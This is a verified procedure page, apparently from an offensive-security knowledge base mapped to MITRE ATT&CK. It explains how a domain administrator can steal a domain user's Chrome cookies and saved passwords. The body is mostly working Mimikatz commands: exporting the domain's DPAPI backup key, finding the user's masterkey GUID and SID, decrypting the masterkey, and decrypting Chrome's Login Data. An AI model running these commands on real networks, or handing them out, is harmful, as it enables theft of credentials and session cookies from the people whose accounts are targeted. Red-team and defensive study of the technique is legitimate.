---
id: 45968f6f-43a5-4c67-a2b9-0d7f83259ff7
name: Extract Chrome Cookies and Credentials from a User's Profile with Domain Admin
type: procedure
verified: true
submitted: true
created_at: '2020-07-21T06:52:31.159985+00:00'
updated_at: '2023-05-25T19:40:01.813525+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Credentials from Web Browsers]]'
platforms:
- Windows
tags:
- '[[Active Directory]]'
- '[[Chrome]]'
- '[[extract]]'
commands:
- '[[mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARG]]'
- '[[Mimikatz Decrypt a User''s Masterkey with the Domain''s Private key]]'
- '[[Mimikatz Export a Domain''s Private Key]]'
- '[[Mimikatz Extract Chrome Credentials from the Current User''s Session]]'
- '[[Mimikatz Extract Chrome Credentials with the Masterkey]]'
- '[[wmic List Windows Users by Name and SID]]'
---

# Extract Chrome Cookies and Credentials from a User's Profile with Domain Admin

**Status**: ✓ Verified

## Summary

Export the domain's private key using Mimikatz's backupkeys module, and use it to decrypt a domain user's masterkey. This procedure requires Domain Administrator privileges. 

## Description

# Description

Export the domain's private key using Mimikatz's backupkeys module, and use it to decrypt a domain user's masterkey. This procedure requires Domain Administrator privileges.



# Instructions

## Extract the Domain Private Key

1. Copy Mimikatz to the target: [Download from GitHub](https://github.com/gentilkiwi/mimikatz)

2. Export the domain's private key.





**Command** ([[Mimikatz Export a Domain's Private Key]]):

```bash
mimikatz.exe "lsadump::backupkeys /system:$_DOMAIN_CONTROLLER.$_DOMAIN /export" "exit"
```



A number of keys will be exported to the current directory. The key with the .rsa.pvk extension can be used to decrypt any domain user's masterkey.



## Enumerate the Locked  Content

1. Identify the location of cookies or passwords, which are generally stored in the following location:


- Cookies: C:\Users\$_USERNAME\AppData\Local\\Google\Chrome\User Data\Default\Cookies

- Credentials: C:\Users\$_USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data



2. Get the GUID of the masterkey associated with the cookies or credentials by running Mimikatz as Administrator and attempting to extract the cookies or credentials. **This should fail.**





**Command** ([[mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARG]]):

```bash
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect"
```



On failure, Mimikatz will display the GUID associated with the cookies or credentials. Eg:





**Code**: [[> Encrypted Key seems to be protected by DPAPI
 * ]]



In this example, the GUID is: **{**84dcc2cc-82c6-44d4-9404-45fd48b4b650}



3. Get the target user's SID.





**Command** ([[wmic List Windows Users by Name and SID]]):

```bash
wmic.exe useraccount get name,sid
```





## Extract the Masterkey and Decrypt Chrome Cookies and Credentials

1. Combine the GUID and user's SID to point to the protected key. It is typically located in:


- C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID



For example: C:\Users\bob\AppData\Roaming\Microsoft\Protect\S-1-5-21-1576920733-1301476157-954876328-1108\84dcc2cc-82c6-44d4-9404-45fd48b4b650



2. Use Mimikatz to extract the masterkey, using the domain's private key.





**Command** ([[Mimikatz Decrypt a User's Masterkey with the Domain's Private key]]):

```bash
mimikatz.exe
dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID" /pvk:$_PRIVATE_KEY.keyx.rsa.pvk
```



Note: Due to nested quotes, it's often easier to execute this command from the Mimikatz prompt.









**Command** ([[Mimikatz Extract Chrome Credentials with the Masterkey]]):

```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```







## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Credentials from Web Browsers]]

## Commands Used

- [[mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARG]]
- [[Mimikatz Decrypt a User's Masterkey with the Domain's Private key]]
- [[Mimikatz Export a Domain's Private Key]]
- [[Mimikatz Extract Chrome Credentials from the Current User's Session]]
- [[Mimikatz Extract Chrome Credentials with the Masterkey]]
- [[wmic List Windows Users by Name and SID]]

## Tags

- [[Active Directory]]
- [[Chrome]]
- [[extract]]


